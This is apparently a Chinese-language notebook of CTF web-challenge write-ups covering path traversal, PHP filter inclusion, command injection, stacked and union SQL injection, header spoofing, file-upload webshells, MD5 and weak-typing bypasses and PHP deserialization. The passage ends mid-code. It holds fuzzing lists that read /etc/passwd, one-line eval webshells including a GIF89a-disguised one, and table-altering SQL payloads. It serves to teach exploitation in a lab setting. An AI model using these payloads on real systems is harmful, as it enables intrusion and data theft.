# Web

## [HCTF 2018]WarmUp

#### 进入站点查看源码可以发现 source.php

![image-20230509225232784](CTF.assets/image-20230509225232784.png)

#### 访问 source.php 发现源码

>   这里有两个关键函数要弄懂

​			

##### `mb_substr`

###### 定义和用法

mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。

**注释：**如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

---

###### 语法

```php
`mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string`
```





| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| *str*    | 必需。从该 string 中提取子字符串。                           |
| *start*  | 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始 |
| *length* | 可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回 |
| encoding | 可选。字符编码。如果省略，则使用内部字符编码。               |

##### `mb_substr`

###### 语法

```php
int mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] )
```

###### 定义和用法

-   `haystack`：要在其中查找子字符串的字符串。
-   `needle`：要查找的子字符串。
-   `offset`：查找的起始位置。如果设置了此参数，则函数将从字符串的此位置开始查找子字符串。如果未设置，则默认为 0。
-   `encoding`：要使用的字符编码。如果未设置，则默认使用 `mb_internal_encoding()` 返回的字符编码。

如果函数在 `haystack` 中找到了 `needle`，则返回其第一次出现的位置，以 0 开头的整数。如果未找到，则返回 `false`。

#### 网站源码

思路：在第13行不能直接返回，否则会直接返回到 hint.php。阅读 19-25 行代码，其中会对`$page`进行切割并覆盖。我们可以利用这一点来构造出`payload`

```php
<?php
class emmm
{
    public static function checkFile(&$page)
    {
        # 白名单
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        if ( !isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }
		# 这里不能直接返回
        if (in_array($page, $whitelist)) {
            return true;
        }

        # mb_substr(src, start, length)
        # 从 start 开始截取 字符串，截取长度：length
        $_page = mb_substr(
            $page,
            0,
            # mb_strpos(str, needle)
            # 返回 指定字符 在字符串中首次出现的位置
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}

if ( !empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}
```



首先访问`hint.php`可以看出`flag`的位置

![image-20230509230821517](CTF.assets/image-20230509230821517.png)

**../即回退到上级目录，在url中使用../的时候 ../最前面随便写什么都行，只返回../最后面的文件数据。**

在source.php?后加一个/，这时source.php会被视为一个文件夹，后面每一级的..意为上一层文件夹，通过不断尝试加入../最后可以知道具体的目录层级，以访问到ffffllllaaaagggg。

最后得到`payload`

`file=hint.php?../../../../../../../ffffllllaaaagggg`

![image-20230509230945255](CTF.assets/image-20230509230945255.png)

## [ACTF2020 新生赛]Include - PHP伪协议

进入网站明显的 PHP 伪协议

<img src="CTF.assets/image-20230511231514373.png" alt="image-20230511231514373" style="zoom:50%;" />

使用 BuroSuite 对其进行模糊测试，下面是 字典

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://filter/read=string.tolower/resource=index.php
php://filter/read=string.strip_tags/resource=index.php
php://filter/read=convert.base64-decode/resource=index.php
php://filter/convert.base64-decode/resource=index.php
php://filter/read=convert.quoted-printable-decode/resource=index.php
php://filter/convert.quoted-printable-decode/resource=index.php
php://filter/convert.uuencode/resource=index.php
php://filter/read=convert.uuencode/resource=index.php
php://filter/convert.urlencode/resource=index.php
php://filter/read=convert.urlencode/resource=index.php
php://filter/gzip/convert.base64-encode/resource=index.php
php://filter/read=string.toupper|convert.base64-encode/resource=index.php
php://filter/read=string.tolower|convert.base64-encode/resource=index.php
php://filter/read=string.rot13|convert.base64-encode/resource=index.php
php://filter/read=zlib.deflate|convert.base64-encode/resource=index.php
php://filter/zlib.deflate|convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate/resource=index.php
php://filter/read=zlib.inflate/convert.base64-encode/resource=index.php
php://filter/zlib.inflate/convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate/convert.base64-decode/resource=index.php
php://filter/zlib.inflate/convert.base64-decode/resource=index.php
php://filter/read=zlib.inflate/convert.quoted-printable-decode/resource=index.php
php://filter/zlib.inflate/convert.quoted-printable-decode/resource=index.php
php://filter/read=zlib.inflate|convert.base64-encode/resource=index.php
php://filter/zlib.inflate|convert.base64-encode/resource=index.php
php://filter/read=zlib.inflate|convert.base64-decode/resource=index.php
php://filter/zlib.inflate|convert.base64-decode/resource=index.php
php://filter/read=zlib.inflate|convert.quoted-printable-decode/resource=index.php
php://filter/zlib.inflate|convert.quoted-printable-decode/resource=index.php
php://filter/convert.base64-encode/resource=flag.php
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/zlib.deflate/convert.base64-encode/resource=flag.php
php://filter/zlib.deflate/resource=flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/read=string.toupper/resource=flag.php
php://filter/read=string.tolower/resource=flag.php
php://filter/read=string.strip_tags/resource=flag.php
php://filter/read=convert.base64-decode/resource=flag.php
php://filter/convert.base64-decode/resource=flag.php
php://filter/read=convert.quoted-printable-decode/resource=flag.php
php://filter/convert.quoted-printable-decode/resource=flag.php
php://filter/convert.uuencode/resource=flag.php
php://filter/read=convert.uuencode/resource=flag.php
php://filter/convert.urlencode/resource=flag.php
php://filter/read=convert.urlencode/resource=flag.php
php://filter/gzip/convert.base64-encode/resource=flag.php
php://filter/read=string.toupper|convert.base64-encode/resource=flag.php
php://filter/read=string.tolower|convert.base64-encode/resource=flag.php
php://filter/read=string.rot13|convert.base64-encode/resource=flag.php
php://filter/read=zlib.deflate|convert.base64-encode/resource=flag.php
php://filter/zlib.deflate|convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate/resource=flag.php
php://filter/read=zlib.inflate/convert.base64-encode/resource=flag.php
php://filter/zlib.inflate/convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate/convert.base64-decode/resource=flag.php
php://filter/zlib.inflate/convert.base64-decode/resource=flag.php
php://filter/read=zlib.inflate/convert.quoted-printable-decode/resource=flag.php
php://filter/zlib.inflate/convert.quoted-printable-decode/resource=flag.php
php://filter/read=zlib.inflate|convert.base64-encode/resource=flag.php
php://filter/zlib.inflate|convert.base64-encode/resource=flag.php
php://filter/read=zlib.inflate|convert.base64-decode/resource=flag.php
php://filter/zlib.inflate|convert.base64-decode/resource=flag.php
php://filter/read=zlib.inflate|convert.quoted-printable-decode/resource=flag.php
php://filter/zlib.inflate|convert.quoted-printable-decode/resource=flag.php
php://input
php://stdin
php://memory
php://temp
php://output
php://fd
php://data
php://filter/convert.base64-decode/resource=file:///etc/passwd
php://filter/convert.base64-decode/resource=php://input
php://filter/convert.base64-decode/resource=php://stdin
php://filter/convert.base64-decode/resource=php://memory
php://filter/convert.base64-decode/resource=php://temp
php://filter/convert.base64-decode/resource=php://output
php://filter/convert.base64-decode/resource=php://fd
php://filter/convert.base64-decode/resource=php://data
php://filter/read=convert.base64-decode/resource=file:///etc/passwd
php://filter/read=convert.base64-decode/resource=php://input
php://filter/read=convert.base64-decode/resource=php://stdin
php://filter/read=convert.base64-decode/resource=php://memory
php://filter/read=convert.base64-decode/resource=php://temp
php://filter/read=convert.base64-decode/resource=php://output
php://filter/read=convert.base64-decode/resource=php://fd
php://filter/read=convert.base64-decode
```

获得 flag Base64 编码，对其进行 Base64 解码即可

<img src="CTF.assets/image-20230511231715030.png" alt="image-20230511231715030" style="zoom:50%;" />

## [GXYCTF2019]Ping Ping Ping - 系统命令执行过滤绕过

首先使用 Burp Suite做模糊测试测试出能使用的命令拼接符，字典如下：

```
; whoami
&& whoami
|| whoami
& whoami
| whoami
; echo test
&& echo test
|| echo test
& echo test
| echo test
; cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd
& cat /etc/passwd
| cat /etc/passwd
; id
&& id
|| id
& id
| id
; pwd
&& pwd
|| pwd
& pwd
| pwd
; ls -la
&& ls -la
|| ls -la
& ls -la
| ls -la
; ps aux
&& ps aux
|| ps aux
& ps aux
| ps aux
; netstat -an
&& netstat -an
|| netstat -an
& netstat -an
| netstat -an
; ping -c 3 127.0.0.1
&& ping -c 3 127.0.0.1
|| ping -c 3 127.0.0.1
& ping -c 3 127.0.0.1
| ping -c 3 127.0.0.1
&\ls
&&\ls
|\ls
||\ls
;ls
;\ls
```

==效果==

<img src="CTF.assets/image-20230511233624153.png" alt="image-20230511233624153" style="zoom:50%;" />

后面发现空格对空格进行了绕过，得出payload如下

解释：$IFS$9 对空格进行绕过，使用反引号对`ls`进行包裹，使得`ls`命令得到的结果返回给`cat`进行二次操作

```
cat$IFS$9`ls`
```

Kali 效果展示





==Fuzz字典==

```
+
cat+`ls`
$
cat$`ls`
%09
cat%09`ls`
$IFS$9
cat$IFS$9`ls`
${IFS}
cat${IFS}`ls`
```

==flag输出==

<img src="CTF.assets/image-20230511234029608.png" alt="image-20230511234029608" style="zoom:50%;" />

## [强网杯 2019]随便注

#### 前置知识：堆叠注入

原理：通过使用`;`闭合前面的SQL语句。再在后面构造新的SQL语句

```SQL
mysql> select * from int_intruder where id=1;show tables;
+----+----------+----------+
| id | username | passwd   |
+----+----------+----------+
|  1 | jake     | Aa123456 |
+----+----------+----------+
1 row in set (0.01 sec)

+--------------------+
| Tables_in_intruder |
+--------------------+
| int_intruder       |
| str_intruder       |
+--------------------+
2 rows in set (0.00 sec)
```

#### 实战流程

通过常规`UNION`注入发现对SQL关键词进行了屏蔽

<img src="CTF.assets/image-20230512233852720.png" alt="image-20230512233852720" style="zoom: 67%;" />

通过观察过滤字符串发现并没有对`show`关键字进行过滤。此时可以尝试使用堆叠注入（成功输出表名）

+ payload：`1';show tables;#`

<img src="CTF.assets/image-20230512233953605.png" alt="image-20230512233953605" style="zoom:50%;" />

对`1919810931114514`进行字段查询（注意由于`1919810931114514`是由数字组成，所以查询时需要使用反引号进行包裹）

payload：``1';show columns from `1919810931114514`;#``

<img src="CTF.assets/image-20230512234232410.png" alt="image-20230512234232410" style="zoom:50%;" />

注意：对于`show`关键字的查询，最多只能查询到字段名，无法获取具体的值。所以此时需要另外想办法

+ 由于后台处理是查询`words`且查询的是`id`。所以这里的解法之一是：通过对两张表的名字互换并为`1919810931114514`添加`id`自增长字段以达到直接通过查询得到`flag`
+ payload：``1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;#``

<img src="CTF.assets/image-20230512234729114.png" alt="image-20230512234729114" style="zoom:50%;" />

直接查询1得到`flag`

<img src="CTF.assets/image-20230512234833080.png" alt="image-20230512234833080" style="zoom:50%;" />

## [极客大挑战 2019]Http

#### 前置知识：HTTP基本字段认识

+ HTTP协议中的`Referer`字段用于告知服务器当前请求来源于**哪一个网站或者哪一个网站**
+ HTTP协议中的`X-Forwarded-For`字段用于告知服务器当前请求来源于或者经过**哪一个IP地址**
+ HTTP协议中的`User-Agent`字段用于告知服务器当前请求的**客户端浏览器信息**、**客户端浏览器版本**、**客户端操作系统**

#### 实战流程

进入网站被告知不是来自`https://Sycsecret.buuoj.cn`，使用`Referer`进行绕过

payload：`Referer: https://Sycsecret.buuoj.cn`

<img src="CTF.assets/image-20230512235744243.png" alt="image-20230512235744243" style="zoom:50%;" />

绕过后被告知不是使用`Syclover`浏览器，通过修改`User-Agent`绕过

payload：`Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/98.0.4758.82`

<img src="CTF.assets/image-20230512235932204.png" alt="image-20230512235932204" style="zoom:50%;" />

绕过浏览器限制后被告知不是来自于本地网络访问，通过修改`X-Forwarded-Fo`绕过

payload：`X-Forwarded-For: 127.0.0.1`

<img src="CTF.assets/image-20230513000230387.png" alt="image-20230513000230387" style="zoom:50%;" />

## [极客大挑战 2019]Upload - GIF89a 头文件欺骗

#### 前置知识

##### GIF89a 头文件欺骗

在系统读取到`GIF89a`这个头文件代码之后，就会直接将该文件当成**图片文件**来处理，并且不会再对后续的内容做**安全过滤**

##### PHTML 后缀

`phtml`后缀是PHP2的后缀名，在PHP4以后都是直接使用`php`后缀名，但直到现在，`phtml`后缀任然有效

##### PHP木马的各种写法

```php
<?php eval($_POST['cmd']);?>

<% eval($_POST['cmd']);%>

<O>h=@eval($_POST['cmd']);</O>

<?="helloworld";?>

<script language="php">@eval($_POST['cmd']);</script>
```



#### 实战流程

##### 构造木马文件

```
GIF89a
<script language="php">@eval($_POST['cmd']);</script>
```

##### 使用bp拦截并修改数据包

将文件类型改为：image/jpeg 即可，`$_file` 在接收文件时，通过判断HTTP`Request`中的`Content-Type`来判断文件内容

<img src="CTF.assets/image-20230513204920661.png" alt="image-20230513204920661" style="zoom:50%;" />

##### 最后使用蚁剑连接即可

<img src="CTF.assets/image-20230513205010186.png" alt="image-20230513205010186" style="zoom:50%;" />

## [ACTF2020 新生赛]BackupFile - 备份文件

#### 前置知识

这题比较简单，利用的是PHP语言是一门弱语言类型这一特点



```php
<?php
$str = '123';
# 判断是否是数字
var_dump(intval($str));
var_dump($str == 123);
```

==输出==

```php
# 我们可以看出，即使 $str 是字符串，PHP一样可以把他判断为 int 类型，且跟 int:123 相等
D:\PHP\tmp.php:3:
int(123)
D:\PHP\tmp.php:4:
bool(true)
```

#### 实战流程

##### 寻找源文件

进入网站发现需要我们寻找源文件，这里直接使用bp做模糊测试即可

<img src="CTF.assets/image-20230513210004580.png" alt="image-20230513210004580" style="zoom:50%;" />

使用bp做模糊测试，加载PHP备份文件字典，注意取消`Payload Encodeing`

<img src="CTF.assets/image-20230513210114882.png" alt="image-20230513210114882" style="zoom:50%;" />

<img src="CTF.assets/image-20230513210132184.png" alt="image-20230513210132184" style="zoom:50%;" />

<img src="CTF.assets/image-20230513210150559.png" alt="image-20230513210150559" style="zoom:50%;" />

##### Payload

```
http://fd81ad6c-4bb4-47d8-bf46-d9a9f600ea58.node4.buuoj.cn:81/index.php?key=123
```

## [RoarCTF 2019]Easy Calc

#### 前置知识

##### `$_GET`绕过

```
对于$_GET的传参，在前面加空格或者'+'都不影响识别

一般输入：?num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
  
空格输入：? num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
  
+输入：?+num=123
D:\PHP\tmp.php:3:
array (size=1)
  'num' => string '123' (length=3)
```

##### `scandir()`

`scandir(目录路径)`：用于扫描文件目录所有的文件

##### `file_get_contents(文件路径)`

`file_get_contents(文件路径)`：用于读取文件内容

#### 实战流程

进入站点查看源文件，说明其中有WAF过滤并发现网页源码

<img src="CTF.assets/image-20230514165920207.png" alt="image-20230514165920207" style="zoom:50%;" />

从网页源码可以看出是有一个黑名单过滤的，但是这里的黑名单可以使用 ASCII 编码绕过

<img src="CTF.assets/image-20230514165941172.png" alt="image-20230514165941172" style="zoom:50%;" />

输入`?num=phpinfo()`查看发现疑似被WAF过滤

<img src="CTF.assets/image-20230514170151741.png" alt="image-20230514170151741" style="zoom:50%;" />

输入`? num=phpinfo()`成功绕过

<img src="CTF.assets/image-20230514170245267.png" alt="image-20230514170245267" style="zoom:50%;" />

再次查看源码，其实很明显，能作妖的地方只有`eval`函数，我们使用`scandir()`函数读取文件。发现flag

payload：`?%20num=var_dump(scandir(chr(47)))`这里的`chr(47)`等于`/`。即查看根目录的文件信息

<img src="CTF.assets/image-20230514170624273.png" alt="image-20230514170624273" style="zoom:50%;" />

使用`file_get_contents`读取文件内容

payload：`?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

这条payload = `?%20num=var_dump(file_get_contents('/f1agg'))`

<img src="CTF.assets/image-20230514171252435.png" alt="image-20230514171252435" style="zoom:50%;" />

## [极客大挑战 2019]BuyFlag

要成功获取到 POST 需要3个前提条件：

1. You must be a student from CUIT!!!
2. You must be answer the correct password!!!
3. FLAG NEED YOUR 100000000 MONEY

通过多次刷新可以发现Cookie字段，将cookie字段改为1，可成功得到学生身份（cookie不会在第一个数据包出现，所以记住：以后抓包不抓第一个数据包）

<img src="CTF.assets/image-20230514175345962.png" alt="image-20230514175345962" style="zoom:50%;" />

F12可查看网页源码，这里提示必须POST提交 money 和 password

<img src="CTF.assets/image-20230514175417121.png" alt="image-20230514175417121" style="zoom:50%;" />

POST payload：`password=404a&money=1e9`

password = 404a 以绕过函数`is_numeric()`的监测。money=1e9 使用科学计数法来绕过对money的长度检查<img src="CTF.assets/image-20230514175603654.png" alt="image-20230514175603654" style="zoom: 50%;" />

## [BJDCTF2020]Easy MD5

#### 前置知识：md5 函数绕过

##### md5($password,true)导致的注入

`select * from 'admin' where password=md5($pass,true)`

```
md5(string,raw)，第一个参数必填，第二个可选
当第二个参数默认不写为FALSE，就返回32位16进制的字符串
当第二个参数为TRUE，返回16位原始二进制格式的字符串
```

绕过原理：

`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是 `‘ or ‘6`，

而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是`select * from ‘admin’ where password=’’ or ‘6xxxxx’`

而`or ‘6xxxxx’` 在mysql判断里面，相当于or 1 ，即等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数


##### 数组绕过

md5()函数**无法处理数组**，如果传入的为数组，会返回`NULL`，所以两个数组经过加密后得到的都是NULL,也就是相等的

```php
<?php
$a = array('aaa');
$b = array('bbb');
# 判断两个数组的值是否相等
var_dump($a==$b);
# 由于md5函数无法处理数组，所以当md5函数对数组进行计算的时候，会返回空。以至于 $a=$b
@var_dump(md5($a) == md5($b));
```

==输出==

```php
D:\PHP\tmp.php:5:
bool(false)
D:\PHP\tmp.php:7:
bool(true)
```

##### 两个或三个等号时候可以采用碰撞的方法绕过

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    echo $flag;
}
```

PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0

```
QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
  
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
```

#### 实战流程

进入网站没有发现任何线索，抓包可也发现提示！

<img src="CTF.assets/image-20230515184612720.png" alt="image-20230515184612720" style="zoom:50%;" />

`select * from 'admin' where password=md5($pass,true)`这条代码是PHP的代码。在这里可以使用**md5万能密码**绕过。与PHP万能密码原理一样，都是通过构造类似`or 1=1`的恒真布尔判断。根据前置知识可以知道使用`ffifdyop`



成功绕过后进入一个新站点，查看源码可发现线索

<img src="CTF.assets/image-20230515185039454.png" alt="image-20230515185039454" style="zoom:50%;" />

判断条件是`$a != $b`并且`md5($a) == md5($b)`这里可以使用数组进行绕过，通过对数组赋予不同的值可使`$a != $b`为True。并且由于md5函数无法对数组进行计算，所以会直接返回`NULL`， 可使得`md5($a) == md5($b)`为True

<img src="CTF.assets/image-20230515185512978.png" alt="image-20230515185512978" style="zoom:50%;" />

进入站点之后其实原理都一样了，只不过这里需要使用POST提交

<img src="CTF.assets/image-20230515185631953.png" alt="image-20230515185631953" style="zoom:50%;" />



## [GXYCTF2019]BabySQli

### 前置知识

MySQL的联合查询如果where条件没有查到东西，那么就会返回union查询后的查询结果

```mysql
mysql> select * from user;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

# union 查询id=2，数据不存在，返沪呗查询内容本身
mysql> select * from user where id=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

# 以此就能做到伪造数据表的目的
mysql> select * from user where id=2 union select 1,'admin',md5(123456);
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

### 解题流程

***1. 进入网站***

进入网站发现是一个登录页面

<img src="CTF.assets/image-20230619005022656.png" alt="image-20230619005022656" style="zoom:50%;" />

***2. 尝试登录***

密码错误，可知账户名是：admin

<img src="CTF.assets/image-20230619005044847.png" alt="image-20230619005044847" style="zoom:50%;" />

***3. 查看源码***

查看源码发现一串字符串:``

|      | <!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--> |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

**![image-20230619005141904](CTF.assets/image-20230619005141904.png)**

发现SQL语句

```bash
import base64

data = "MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5"
data = base64.b32decode(data)
print(data)

b64 = base64.b64decode(data)
print(b64)

# 输出
C:\Python\python.exe "D:\Python\Linux 应急响应\test2.py" 
b'c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw=='
b"select * from user where username = '$name'"
```

***4. 尝试SQL注入***

经过测试，网站对`( ) or`进行了过滤，一旦出现这些字符串就无法进行注入，所以这里只能用：`union select`，但是网站本身的回显只有两种情况：`wrond user | worng pass`，所以没有办法做常规的联合注入

**4.1 union 注入**

首先先确定查询的列数，为3

<img src="CTF.assets/image-20230619010318839.png" alt="image-20230619010318839" style="zoom:50%;" />



假设第一列为用户名：`wrong user`

<img src="CTF.assets/image-20230619010423997.png" alt="image-20230619010423997" style="zoom:50%;" />

假设第二列为用户名：`wrong pass`，以此就可以推断出第二列是用户名。

<img src="CTF.assets/image-20230619010456788.png" alt="image-20230619010456788" style="zoom:50%;" />

**4.2 源码审计**

```bash
# 测试语句

# 当SQL语句是正确的时候，$res为TRUE
<?php
$db = mysqli_connect('127.0.0.1', 'root', 'root', 'intruder');
$sql = "select * from user where username='23456'";
$res = mysqli_query($db, $sql);
var_dump(boolval($res));

# 输出
D:\PHP\test.php:5:
bool(true)


# 当SQL语句是错误的时候，$res为False
<?php
$db = mysqli_connect('127.0.0.1', 'root', 'root', 'intruder');
$sql = "select * from user wh username='23456'";
$res = mysqli_query($db, $sql);
var_dump(boolval($res));

# 输出
D:\PHP\test.php:5:
bool(false)
```



```php
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Do you know who am I?</title>
<?php
require "config.php";
require "flag.php";
 
// 去除转义
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
        array_map('stripslashes_deep', $value) :
        stripslashes($value);
        return $value;
    }
 
    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
 
mysqli_query($con,'SET NAMES UTF8');
$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
# SQL语句执行
$sql = "select * from user where username = '".$name."'";
$result = mysqli_query($con, $sql);
 
# 输入过滤：( ) = or
if(preg_match("/\(|\)|\=|or/", $name)){
    die("do not hack me!");
}
else{
    # SQL语句执行错误，返回False
    if (!$result) {
        printf("Error: %s\n", mysqli_error($con));
        exit();
    }
    # SQL语句执行正确执行分支
    else{
        $arr = mysqli_fetch_row($result);
        # 匹配输入用户名是否是“admin”
        if($arr[1] == "admin"){
            # 匹配密码md5之后是否相同
            if(md5($password) == $arr[2]){
                echo $flag;
            }
            else{
                die("wrong pass!");
            }
        }
        else{
            die("wrong user!");
        }
    }
}
 
?>
```

**4.3 最后答案**

整个题目其实最难的点就是不知道密码做了MD5的操作，利用UNION查询查不到数据的时候会伪造一条数据的特点就可以绕过

```mysql
mysql> select * from user where id=2 union select 1,'admin',md5(123456);
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

python 计算`123456`的md5值

```py
import hashlib

data = '123456'
md5 = hashlib.md5(data.encode('utf-8'))
print(md5.hexdigest())

# 输出
e10adc3949ba59abbe56e057f20f883e
```



最后`payload`：`name=-1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'--+&pw=123456`

<img src="CTF.assets/image-20230619012842604.png" alt="image-20230619012842604" style="zoom:50%;" />

## [网鼎杯 2020 青龙组]AreUSerialz

### 前置知识

这题有3个解法：

1. 使用`\00`绕过
2. 使用PHP伪协议
3. 利用PHP7.1 x对属性类型不敏感

PHP 属性类型不敏感演示

```php
# 原题
<?php
class Test1{
    protected $str = '1';

    public function __destruct(){
        echo $this->str;
    }

}

$t = new Test1();
echo serialize($t);



# 直接将 protected 改成 public
<?php
class Test1
{
    public $str = '1';

    public function __destruct()
    {
        echo $this->str;
    }

}

$res = unserialize('O:5:"Test1":1:{s:3:"str";s:2:"10";}');

# 输出
10
```

### 解题流程

**1. 题目代码**

```bash
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected` $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

	# op 必须要等于1
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

# 如果输入进来的字符串不在 ASCII码 32 - 125 的范围内，直接退出程序
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

**2. 解法一**

+ `op===2`，直接使用`'2'`就好
+ `is_vaild`函数，必须要求在ASCII码 32 - 125 的范围内

由于`%00`经过URL解码后不在规定范围之内，所以会被`is_vaild`拦截，这里网上的办法是：**利用大写S采用的16进制，来绕过is_valid中对空字节的检查。 //00 替换 %00 。**这里我也不能理解为什么最后要用S来代替s

最后payload：`O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:0:"";}`

**2. 解法二**

利用PHP7.1+对属性类型不敏感，直接将`protected`改为`public`，输出反序列字符串

payload：`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}`

**3. 解法三**

PHP伪协议

## [MRCTF2020]Ez_bypass

这题考的还是PHP弱语言类型，考的还是比较简单

### 前置知识

**PHP md5函数绕过**

`md5()`无法处理数组，所以会直接返回null，具体可看上面的Easy MD5

```php
<?php
$str[] = 'a';
var_dump(md5($str));

# 输出
NULL
```

**is_numeric 无法检测纯数字字符串**

```php
<?php
var_dump(is_numeric('123456'));

# 输出
bool(true)
```

### 解题流程

```php
<?php
include 'flag.php';
$flag = 'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if (isset($_GET['gg']) && isset($_GET['id'])) {
    $id = $_GET['id'];
    $gg = $_GET['gg'];
    # 绕过点1：md5 函数绕过，id 和 gg 都要是数组
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if (isset($_POST['passwd'])) {
            $passwd = $_POST['passwd'];
            # 绕过点2：要求 passwd 不是数字但是又要等于1234567
            if (!is_numeric($passwd)) {
                if ($passwd == 1234567) {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0');
                } else {
                    echo "can you think twice??";
                }
            } else {
